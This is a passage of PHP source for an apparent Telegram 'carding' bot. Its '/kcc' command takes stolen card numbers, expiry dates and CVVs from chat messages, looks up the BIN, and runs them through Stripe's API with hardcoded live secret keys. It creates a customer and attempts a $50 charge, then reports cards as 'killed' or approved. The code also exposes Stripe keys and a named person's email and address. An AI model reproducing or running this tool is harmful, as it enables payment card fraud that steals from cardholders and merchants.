              elseif ((strpos($result2, "transaction_not_allowed")) || (strpos($result3, "transaction_not_allowed"))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» HOLDERLOCKED ⚠️</b>%0A<b>Response -» Transaction Not Allowed </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b", $message_id);}
              elseif ((strpos($result2, "fraudulent")) || (strpos($result3, "fraudulent"))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» REJECTED ⛔</b>%0A<b>Response -» Fraudulent </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              elseif ((strpos($result2, "expired_card")) || (strpos($result3, "expired_card"))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» expired_card </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              elseif ((strpos($result2, "generic_declined")) || (strpos($result3, "generic_declined"))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Generic Declined </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
              }
              elseif ((strpos($result1, "do_not_honor")) || (strpos($result3, "do_not_honor"))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              elseif ((strpos($result1, 'rate_limit')) || (strpos($result3, 'rate_limit'))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              
              elseif ((strpos($result1, "Your card was declined.")) || (strpos($result3, "Your card was declined."))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
              sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» No Account </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
              else {
              sendMessage($chatId, "<b><u><i>Unknown Error</i></u></b>", $message_id);
              };
        }
    //////////=========[kcc Command]=========//////////
    elseif (strpos($message, "/kcc") === 0){
        $skeys = array(
            1 => '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', // Enter at least one sk key
          //2 => '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',-----------------|
          //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
          //4 => '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',                 |
          //5 => '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',-----------------|
          ); 
          $skey = array_rand($skeys);
          $sk = $skeys[$skey];
       
        $message = substr($message, 4);
        $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
        $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
        $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
        $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
        $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
        if (empty($amt)) {
        $amt = '1';
        }
                $amount = $amt * 100;
                $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch);
                $bank = GetStr($fim, '"bank":{"name":"', '"');
                $name = GetStr($fim, '"name":"', '"');
                $brand = GetStr($fim, '"brand":"', '"');
                $country = GetStr($fim, '"country":{"name":"', '"');
                $emoji = GetStr($fim, '"emoji":"', '"');
                $scheme = GetStr($fim, '"scheme":"', '"');
                $type = GetStr($fim, '"type":"', '"');
                if(strpos($fim, '"type":"credit"') !== false){
                $bin = 'Credit';
                }else{
                $bin = 'Debit';
                };
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Corey Stowe&owner[email]=cstowe083@gmail.com&owner[address][line1]=2509 Mountainview Dr&owner[address][city]=Corinth&owner[address][state]=Texas&owner[address][postal_code]=87210&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
                $result1 = curl_exec($ch);
                $tok1 = Getstr($result1,'"id": "','"');
                $msg1 = Getstr($result1,'"message": "','"');
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Stowe&source='.$tok1.'&address[line1]=2509 Mountainview Dr&address[city]=Corinth&address[state]=Texas&address[postal_code]=87210&address[country]=US');
                $result2 = curl_exec($ch);
                $tok2 = Getstr($result2,'"id": "','"');
                $msg2 = Getstr($result2,'"message": "','"');
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=5000&currency=usd&customer='.$tok2.'');
                $result3 = curl_exec($ch);
                $msg3 = Getstr($result3,'"message": "','"');
                $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
                $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
                $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
                if(strpos($result3, '"seller_message": "Payment complete."' )) {
                sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 50$ ✅</b>%0A<b>Response -» killed 50$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Charge v2 </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
                }
                elseif(strpos($result2, "insufficient_funds" )) {
                sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» Insufficient Funds </b>%0A<b>Gateway -» Stripe Charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APROVED ⚠️</b>%0A<b>Response -» 3D Card </b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                elseif(strpos($result2,'"cvc_check": "pass"')){
                sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» CVC APPROVED ✅</b>%0A<b>Gateway -» Stripe charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                elseif(strpos($result3,'"code": "incorrect_cvc"')){
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  elseif(strpos($result2,'"code": "incorrect_cvc"')){
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  elseif ((strpos($result2, "transaction_not_allowed")) || (strpos($result3, "transaction_not_allowed"))){
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» HOLDERLOCKED ⚠️</b>%0A<b>Response -» Transaction Not Allowed </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b", $message_id);}
                  elseif ((strpos($result2, "fraudulent")) || (strpos($result3, "fraudulent"))){
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» REJECTED ⛔</b>%0A<b>Response -» Fraudulent </b>%0A<b>Risk Level: $rsklv</b>%a<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  elseif ((strpos($result2, "expired_card")) || (strpos($result3, "expired_card"))){
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» expired_card </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  elseif ((strpos($result2, "generic_declined")) || (strpos($result3, "generic_declined"))){
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Generic Declined </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  }
                  elseif ((strpos($result1, "do_not_honor")) || (strpos($result3, "do_not_honor"))){
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  elseif ((strpos($result1, 'rate_limit')) || (strpos($result3, 'rate_limit'))){
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  
                  elseif ((strpos($result1, "Your card was declined.")) || (strpos($result3, "Your card was declined."))){
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» No Account </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
                  else {
                  sendMessage($chatId, "<b><u><i>Unknown Error</i></u></b>", $message_id);
                  };
            }

function sendMessage ($chatId, $message, $message_id){
    $url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
    file_get_contents($url);
    };